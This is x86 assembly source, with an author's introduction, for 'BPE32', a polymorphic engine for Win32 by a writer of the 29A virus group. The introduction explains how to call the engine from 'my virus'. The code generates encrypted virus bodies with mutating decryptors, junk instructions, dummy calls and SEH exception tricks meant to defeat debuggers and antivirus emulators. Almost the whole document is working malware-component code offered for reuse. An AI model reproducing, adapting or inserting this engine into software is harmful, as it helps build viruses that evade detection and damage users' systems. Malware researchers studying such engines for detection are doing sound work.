;                                                     ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹
;   ⁄ƒ Benny's Polymorphic Engine for Win32 ƒø        €€€ €€€ €€€ €€€ €€€ €€€
;   ≥                   by                   ≥         ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€
;   ¿ƒƒƒƒƒƒƒƒƒƒƒƒƒ Benny / 29A ƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ        €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€
;                                                     €€€€€€€ €€€€€€ﬂ €€€ €€€
;
;
;
;
;
;Hello everybody,
;
;let me introduce advanced and improved version of BPE32. First version was
;published in DDT#1 but after some days I found many bugs caused by fast
;optimization of code. Please, forgive me and rather use this engine instead of
;that one from DDT#1. Now, here is the description.
;
;
;
;This poly engine is able to:
;-----------------------------
;
;1) Create SEH handler, cause exception and so fuck some tiny debuggers
;   and AV emulators.
;2) Randomly change registers in instructions.
;3) Generate different instructions, which do the same thing.
;4) Swap groups of instructions between them.
;5) Create calls and jumps to dummy routines.
;6) Generate junk instructions between real code (also undocumented opcode SALC).
;
;
;
;Special features:
;------------------
;
;1) It uses one Pentium instruction (RDTSC for gettin' random numbers).
;2) It creates variable decryptor size.
;3) It encrypts and decrypts whole DWORDs.
;4) It's optimized as well, its size is "only" 1498 bytes.
;
;
;
;Decryptor:
;-----------
;
;Decryptor is in fact a simple procedure. On startup it is simply called by CALL
;instruction. After that r placed encrypted data. When decryptor finishes its
;work, it's terminated by RET instruction and execution continues on decrypted
;instructions. Simple and effective.
;
;Graphicaly:
;
;		<junk instructions>
; ⁄ƒƒƒƒƒƒƒƒƒƒƒƒ call decryptor
; ≥             <encrypted dwords> <ƒø
; ¿> decryptor: SEH handler          ≥
;               delta getter         ≥
;               decryption           ≥
;               loop decryptor       ≥
;               ret ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
;
;
;NOTE: There r ofcoz junk instructions placed between code in decryptor.
;
;
;
;SEH handler:
;-------------
;
;Here is a sample of decryptors SEH handler:
;
;start:		call end_seh_fn
;		mov esp, [esp+8]
;		jmp seh_rs
;end_seh_fn:	sub edx, edx
;		push dword ptr fs:[edx]
;		mov fs:[edx], esp
;		inc byte ptr [edx]
;               jmp start        ;IMPORTANT! Some AV emulators after exception
;                                ;tries to emulate next opcode (e.g. NODICE32).
;seh_rs:	xor edi, edi
;		pop dword ptr fs:[edi]
;		pop edi
;
;NOTE: Some registers and opcodes r variable in SEH handler.
;
;
;
;Junk instructions:
;-------------------
;
;Every good poly engine should be able to create one byte, two byte, three byte
;and five byte junk instructions between real code. Better polys should be able
;to create calls and jumps to ;dummy routines. BPE32 can do it. It uses EAX register
;as junk register and supports up to five bytes instructions. Calls and jumps
;r supported as well as simple conditional jumps.
;
;
;
;How can I use BPE32 in my virus ?
;----------------------------------
;
;BPE32 is all placed in "BPE32" procedure, suprisely X-D.
;
;
;Input state:
;1) ESI register - pointer to data, u wanna encrypt.
;2) EDI register - pointer to memory, where BPE32 will store decryptor and encrypted data
;3) ECX register - number of DWORDs (!), u wanna encrypt. Hey guy, take special care
;		   for this parameter and calculate number of bytes by this: (_end-start+3)/4
;4) EBP register - delta offset
;
;CALL BPE32	 - do not forget to type this ;-))
;
;Output state:
;1) EAX register - size of decryptor+encrypted_data in BYTEs.
;2) ALL other registers r without changes.
;
;
;
;Hey maestro, u could code better engine:
;-----------------------------------------
;
;Yeah, u r right, I could code better engine. Generaly, I could make
;at least 100 instructions per one instruction group, I know. But
;I wanted to be this engine as kewl as possible and as small as
;possible. I think, it's at least a little kewl, it can do
;everything, that kewl engine could be able to do, u dont think ?
;
;
;
;For who is this stuff:
;-----------------------
;
;This engine is dedicated to 29A and all 29Aers.
;
;
;
;Now enjoy...



RDTCS	equ	<dw	310Fh>			;RDTCS opcode
SALC	equ	<db	0D6h>			;SALC opcode


BPE32   Proc
	pushad					;save all regs
	push edi				;save these regs for l8r use
	push ecx				;	...
	mov edx, edi				;	...
	push esi				;preserve this reg
	call rjunk				;generate random junk instructions
	pop esi					;restore it
	mov al, 0e8h				;create CALL instruction
	stosb					;	...
	mov eax, ecx				;	...
	imul eax, 4				;	...
	stosd					;	...

	mov eax, edx				;calculate size of CALL+junx
	sub edx, edi				;	...
	neg edx					;	...
	add edx, eax				;	...
	push edx				;save it

	push 0					;get random number
	call random				;	...
	xchg edx, eax
	mov [ebp + xor_key - mgdelta], edx	;use it as xor constant
	push 0					;get random number
	call random				;	...
	xchg ebx, eax
	mov [ebp + key_inc - mgdelta], ebx	;use it as key increment constant
x_loop:	lodsd					;load DWORD
	xor eax, edx				;encrypt it
	stosd					;store encrypted DWORD
	add edx, ebx				;increment key
	loop x_loop				;next DWORD

	call rjunk				;generate junx

	mov eax, 0006e860h			;generate SEH handler
	stosd					;	...
	mov eax, 648b0000h			;	...
	stosd					;	...
	mov eax, 0ceb0824h			;	...
	stosd					;	...

greg0:	call get_reg				;get random register
	cmp al, 5				;MUST NOT be EBP register
	je greg0
	mov bl, al				;store register
	mov dl, 11				;proc parameter (do not generate MOV)
	call make_xor				;create XOR or SUB instruction
	inc edx					;destroy parameter
	mov al, 64h				;generate FS:
	stosb					;store it
	mov eax, 896430ffh			;next SEH instructions
	or ah, bl				;change register
	stosd					;store them
	mov al, 20h				;	...
	add al, bl				;	...
	stosb					;	...

	push 2					;get random number
	call random
	test eax, eax
	je _byte_
	mov al, 0feh				;generate INC DWORD PTR
	jmp _dw_
_byte_:	mov al, 0ffh				;generate INC BYTE PTR
_dw_:	stosb					;store it
	mov al, bl				;store register
	stosb					;	...
	mov al, 0ebh				;generate JUMP SHORT
	stosb					;	...
	mov al, -24d				;generate jump to start of code (trick
        stosb                                   ;for better emulators, e.g. NODICE32)

	call rjunk				;generate junx
greg1:	call get_reg				;generate random register
	cmp al, 5				;MUST NOT be EBP
	je greg1
	mov bl, al				;store it

	call make_xor				;generate XOR,SUB reg, reg or MOV reg, 0

	mov al, 64h				;next SEH instructions
	stosb					;	...
	mov al, 8fh				;	...
	stosb					;	...
	mov al, bl				;	...
	stosb					;	...
	mov al, 58h				;	...
	add al, bl				;	...
	stosb					;	...

	mov al, 0e8h				;generate CALL
	stosb					;	...
	xor eax, eax				;	...
	stosd					;	...
	push edi				;store for l8r use
	call rjunk				;call junk generator

	call get_reg				;random register
	mov bl, al				;store it
	push 1					;random number (0-1)
	call random				;	...
	test eax, eax
	jne next_delta

	mov al, 8bh				;generate MOV reg, [ESP]; POP EAX
	stosb
	mov al, 80h
	or al, bl
	rol al, 3
	stosb
	mov al, 24h
	stosb
	mov al, 58h
	jmp bdelta

next_delta:
	mov al, bl				;generate POP reg; SUB reg, ...
	add al, 58h
bdelta:	stosb
	mov al, 81h
	stosb
	mov al, 0e8h
	add al, bl
	stosb
	pop eax
	stosd
	call rjunk				;random junx

	xor bh, bh				;parameter (first execution only)
	call greg2				;generate MOV sourcereg, ...
	mov al, 3				;generate ADD sourcereg, deltaoffset
	stosb					;	...
	mov al, 18h				;	...
	or al, bh				;	...
	rol al, 3				;	...
	or al, bl				;	...
	stosb					;	...
	mov esi, ebx				;store EBX
	call greg2				;generate MOV countreg, ...
	mov cl, bh				;store count register
	mov ebx, esi				;restore EBX

	call greg3				;generate MOV keyreg, ...
	push edi				;store this position for jump to decryptor
	mov al, 31h				;generate XOR [sourcereg], keyreg
	stosb					;	...
	mov al, ch				;	...
	rol al, 3				;	...
	or al, bh				;	...
	stosb					;	...

	push 6					;this stuff will choose ordinary of calls
	call random				;to code generators
	test eax, eax
	je g5					;GREG4 - key incremention
	cmp al, 1				;GREG5 - source incremention
	je g1					;GREG6 - count decremention
	cmp al, 2				;GREG7 - decryption loop
	je g2
	cmp al, 3
	je g3
	cmp al, 4
	je g4

g0:	call gg1
	call greg6
	jmp g_end
g1:	call gg2
	call greg5
	jmp g_end
g2:	call greg5
	call gg2
	jmp g_end
g3:	call greg5
gg3:	call greg6
	jmp g_out
g4:	call greg6
	call gg1
	jmp g_end
g5:	call greg6
	call greg5
g_out:	call greg4
g_end:	call greg7
	mov al, 61h				;generate POPAD instruction
	stosb					;	...
	call rjunk				;junk instruction generator
	mov al, 0c3h				;RET instruction
	stosb					;	...
	pop eax					;calculate size of decryptor and encrypted data
	sub eax, edi				;	...
	neg eax					;	...
	mov [esp.Pushad_eax], eax		;store it to EAX register
	popad					;restore all regs
	ret					;and thats all folx
get_reg proc					;this procedure generates random register
	push 8					;random number (0-7)
	call random				;	...
	test eax, eax
	je get_reg				;MUST NOT be 0 (=EAX is used as junk register)
	cmp al, 100b				;MUST NOT be ESP
	je get_reg
	ret
get_reg endp
make_xor proc					;this procedure will generate instruction, that
	push 3					;will nulify register (BL as parameter)
	call random
	test eax, eax
	je _sub_
	cmp al, 1
	je _mov_
	mov al, 33h				;generate XOR reg, reg
	jmp _xor_
_sub_:	mov al, 2bh				;generate SUB reg, reg
_xor_:	stosb
	mov al, 18h
	or al, bl
	rol al, 3
	or al, bl
	stosb
	ret
_mov_:	cmp dl, 11				;generate MOV reg, 0
	je make_xor
	mov al, 0b8h
	add al, bl
	stosb
	xor eax, eax
	stosd
	ret
make_xor endp
gg1:	call greg4
	jmp greg5
gg2:	call greg4
	jmp greg6

random	proc					;this procedure will generate random number
						;in range from 0 to pushed_parameter-1
						;0 = do not truncate result
	push edx				;save EDX
        RDTCS					;RDTCS instruction - reads PCs tix and stores
						;number of them into pair EDX:EAX
	xor edx, edx				;nulify EDX, we need only EAX
	cmp [esp+8], edx			;is parameter==0 ?
	je r_out				;yeah, do not truncate result
	div dword ptr [esp+8]			;divide it
	xchg eax, edx				;remainder as result
r_out:	pop edx					;restore EDX
	ret Pshd				;quit procedure and destroy pushed parameter
random	endp
make_xor2 proc					;create XOR instruction
	mov al, 81h
	stosb
	mov al, 0f0h
	add al, bh
	stosb
	ret
make_xor2 endp

greg2	proc					;1 parameter = source/count value
	call get_reg				;get register
	cmp al, bl				;already used ?
	je greg2
	cmp al, 5
	je greg2
	cmp al, bh
	je greg2
	mov bh, al

	mov ecx, [esp+4]			;get parameter
	push 5					;choose instructions
	call random
	test eax, eax
	je s_next0
	cmp al, 1
	je s_next1
	cmp al, 2
	je s_next2
	cmp al, 3
	je s_next3

	mov al, 0b8h				;MOV reg, random_value
	add al, bh				;XOR reg, value
	stosb					;param = random_value xor value
	push 0
	call random
	xor ecx, eax
	stosd
	call make_xor2
	mov eax, ecx
	jmp n_end2
s_next0:mov al, 68h				;PUSH random_value
	stosb					;POP reg
	push 0					;XOR reg, value
	call random				;result = random_value xor value
	xchg eax, ecx
	xor eax, ecx
	stosd
	mov al, 58h
	add al, bh
	stosb
	call make_xor2
	xchg eax, ecx
	jmp n_end2
s_next1:mov al, 0b8h				;MOV EAX, random_value
	stosb					;MOV reg, EAX
	push 0					;SUB reg, value
	call random				;result = random_value - value
	stosd
	push eax
	mov al, 8bh
	stosb
	mov al, 18h
	or al, bh
	rol al, 3
	stosb
	mov al, 81h
	stosb
	mov al, 0e8h
	add al, bh
	stosb
	pop eax
	sub eax, ecx
	jmp n_end2
s_next2:push ebx				;XOR reg, reg
	mov bl, bh				;XOR reg, random_value
	call make_xor				;ADD reg, value
	pop ebx					;result = random_value + value
	call make_xor2
	push 0
	call random
	sub ecx, eax
	stosd
	push ecx
	call s_lbl
	pop eax
	jmp n_end2
s_lbl:	mov al, 81h				;create ADD reg, ... instruction
	stosb
	mov al, 0c0h
	add al, bh
	stosb
	ret
s_next3:push ebx				;XOR reg, reg
	mov bl, bh				;ADD reg, random_value
	call make_xor				;XOR reg, value
	pop ebx					;result = random_value xor value
	push 0
	call random
	push eax
	xor eax, ecx
	xchg eax, ecx
	call s_lbl
	xchg eax, ecx
	stosd
	call make_xor2
	pop eax	
n_end2:	stosd
	push esi
	call rjunk
	pop esi
	ret Pshd
greg2	endp

greg3	proc
	call get_reg				;get register
	cmp al, 5				;already used ?
	je greg3
	cmp al, bl
	je greg3
	cmp al, bh
	je greg3
	cmp al, cl
	je greg3
	mov ch, al
	mov edx, 0			;get encryption key value
xor_key = dword ptr $ - 4

	push 3
	call random
	test eax, eax
	je k_next1
	cmp al, 1
	je k_next2

	push ebx				;XOR reg, reg
	mov bl, ch				;OR, ADD, XOR reg, value
	call make_xor
	pop ebx

	mov al, 81h
	stosb
	push 3
	call random
	test eax, eax
	je k_nxt2
	cmp al, 1
	je k_nxt3

	mov al, 0c0h
k_nxt1:	add al, ch
	stosb
	xchg eax, edx
n_end1:	stosd
k_end:	call rjunk
	ret
k_nxt2:	mov al, 0f0h
	jmp k_nxt1
k_nxt3:	mov al, 0c8h
	jmp k_nxt1
k_next1:mov al, 0b8h				;MOV reg, value
	jmp k_nxt1
k_next2:mov al, 68h				;PUSH value
	stosb					;POP reg
	xchg eax, edx
	stosd
	mov al, ch
	add al, 58h
	jmp i_end1
greg3	endp

greg4	proc
	mov edx, 0 			;get key increment value
key_inc = dword ptr $ - 4
i_next:	push 3
	call random
	test eax, eax
	je i_next0
	cmp al, 1
	je i_next1
	cmp al, 2
	je i_next2

	mov al, 90h				;XCHG EAX, reg
	add al, ch				;XOR reg, reg
	stosb					;OR reg, EAX
	push ebx				;ADD reg, value
	mov bl, ch
	call make_xor
	pop ebx
	mov al, 0bh
	stosb
	mov al, 18h
	add al, ch
	rol al, 3
	stosb
i_next0:mov al, 81h				;ADD reg, value
	stosb
	mov al, 0c0h
	add al, ch
	stosb
	xchg eax, edx
	jmp n_end1
i_next1:mov al, 0b8h				;MOV EAX, value
	stosb					;ADD reg, EAX
	xchg eax, edx
	stosd
	mov al, 3
	stosb
	mov al, 18h
	or al, ch
	rol al, 3
i_end1:	stosb
i_end2:	call rjunk
	ret
i_next2:mov al, 8bh				;MOV EAX, reg
	stosb					;ADD EAX, value
	mov al, 0c0h				;XCHG EAX, reg
	add al, ch
	stosb
	mov al, 5
	stosb
	xchg eax, edx
	stosd
	mov al, 90h
	add al, ch
	jmp i_end1
greg4	endp

greg5	proc
	push ecx
	mov ch, bh
	push 4
	pop edx
	push 2
	call random
	test eax, eax
	jne ng5
	call i_next				;same as previous, value=4
	pop ecx
	jmp k_end
ng5:	mov al, 40h				;4x inc reg
	add al, ch
	pop ecx
	stosb
	stosb
	stosb
	jmp i_end1
greg5	endp

greg6	proc
	push 5
	call random
	test eax, eax
	je d_next0
	cmp al, 1
	je d_next1
	cmp al, 2
	je d_next2

	mov al, 83h				;SUB reg, 1
	stosb
	mov al, 0e8h
	add al, cl
	stosb
	mov al, 1
	jmp i_end1
d_next0:mov al, 48h				;DEC reg
	add al, cl
	jmp i_end1
d_next1:mov al, 0b8h				;MOV EAX, random_value
	stosb					;SUB reg, EAX
	push 0					;ADD reg, random_value-1
	call random
	mov edx, eax
	stosd
	mov al, 2bh
	stosb
	mov al, 18h
	add al, cl
	rol al, 3
	stosb
	mov al, 81h
	stosb
	mov al, 0c0h
	add al, cl
	stosb
	dec edx
	mov eax, edx
	jmp n_end1
d_next2:mov al, 90h				;XCHG EAX, reg
	add al, cl				;DEC EAX
	stosb					;XCHG EAX, reg
	mov al, 48h
	stosb
	mov al, 90h
	add al, cl
	jmp i_end1
greg6	endp

greg7	proc
	mov edx, [esp+4]
	dec edx
	push 2
	call random
	test eax, eax
	je l_next0
	mov al, 51h				;PUSH ECX
	stosb					;MOV ECX, reg
	mov al, 8bh				;JECXZ label
	stosb					;POP ECX
	mov al, 0c8h				;JMP decrypt_loop
	add al, cl				;label:
	stosb					;POP ECX
	mov eax, 0eb5903e3h
	stosd
	sub edx, edi
	mov al, dl
	stosb
	mov al, 59h
	jmp l_next
l_next0:push ebx				;XOR EAX, EAX
	xor bl, bl				;DEC EAX
	call make_xor				;ADD EAX, reg
	pop ebx					;JNS decrypt_loop
	mov al, 48h
	stosb
	mov al, 3
	stosb
	mov al, 0c0h
	add al, cl
	stosb
	mov al, 79h
	stosb
	sub edx, edi
	mov al, dl
l_next:	stosb
	call rjunk
	ret Pshd
greg7	endp

rjunkjc:push 7
	call random
	jmp rjn
rjunk	proc			;junk instruction generator
	push 8
	call random		;0=5, 1=1+2, 2=2+1, 3=1, 4=2, 5=3, 6=none, 7=dummy jump and call
rjn:	test eax, eax
	je j5
	cmp al, 1
	je j_1x2
	cmp al, 2
	je j_2x1
	cmp al, 4
	je j2
	cmp al, 5
	je j3
	cmp al, 6
	je r_end
	cmp al, 7
	je jcj

j1:	call junx1		;one byte junk instruction
	nop
	dec eax
	SALC
	inc eax
	clc
	cwde
	stc
	cld
junx1:	pop esi
	push 8
	call random
	add esi, eax
	movsb
	ret
j_1x2:	call j1			;one byte and two byte
	jmp j2
j_2x1:	call j2			;two byte and one byte
	jmp j1
j3:	call junx3
	db	0c1h, 0c0h	;rol eax, ...
	db	0c1h, 0e0h	;shl eax, ...
	db	0c1h, 0c8h	;ror eax, ...
	db	0c1h, 0e8h	;shr eax, ...
	db	0c1h, 0d0h	;rcl eax, ...
	db	0c1h, 0f8h	;sar eax, ...
	db	0c1h, 0d8h	;rcr eax, ...
	db	083h, 0c0h
	db	083h, 0c8h
	db	083h, 0d0h
	db	083h, 0d8h
	db	083h, 0e0h
	db	083h, 0e8h
	db	083h, 0f0h
	db	083h, 0f8h	;cmp eax, ...
	db	0f8h, 072h	;clc; jc ...
	db	0f9h, 073h	;stc; jnc ...

junx3:	pop esi			;three byte junk instruction
	push 17
	call random
	imul eax, 2
	add esi, eax
	movsb
	movsb
r_ran:	push 0
	call random
	test al, al
	je r_ran
	stosb
	ret
j2:	call junx2
	db	8bh		;mov eax, ...
	db	03h		;add eax, ...
	db	13h		;adc eax, ...
	db	2bh		;sub eax, ...
	db	1bh		;sbb eax, ...
	db	0bh		;or eax, ...
	db	33h		;xor eax, ...
	db	23h		;and eax, ...
	db	33h		;test eax, ...

junx2:	pop esi			;two byte junk instruction
	push 9
	call random
	add esi, eax
	movsb
	push 8
	call random
	add al, 11000000b
	stosb
r_end:	ret
j5:	call junx5
	db	0b8h		;mov eax, ...
	db	05h		;add eax, ...
	db	15h		;adc eax, ...
	db	2dh		;sub eax, ...
	db	1dh		;sbb eax, ...
	db	0dh		;or eax, ...
	db	35h		;xor eax, ...
	db	25h		;and eax, ...
	db	0a9h		;test eax, ...
	db	3dh		;cmp eax, ...

junx5:	pop esi			;five byte junk instruction
	push 10
	call random
	add esi, eax
	movsb
	push 0
	call random
	stosd
	ret
jcj:	call rjunkjc		;junk
	push edx		;CALL label1
	push ebx		;junk
	push ecx		;JMP label2
	mov al, 0e8h		;junk
	stosb			;label1: junk
	push edi		;RET
	stosd			;junk
	push edi		;label2:
	call rjunkjc		;junk
	mov al, 0e9h
	stosb
	mov ecx, edi
	stosd
	mov ebx, edi
	call rjunkjc
	pop eax
	sub eax, edi
	neg eax
	mov edx, edi
	pop edi
	stosd
	mov edi, edx
	call rjunkjc
	mov al, 0c3h
	stosb
	call rjunkjc
	sub ebx, edi
	neg ebx
	xchg eax, ebx
	push edi
	mov edi, ecx
	stosd
	pop edi
	call rjunkjc
	pop ecx
	pop ebx
	pop edx
	ret
rjunk	endp
BPE32     EndP			;BPE32 ends here
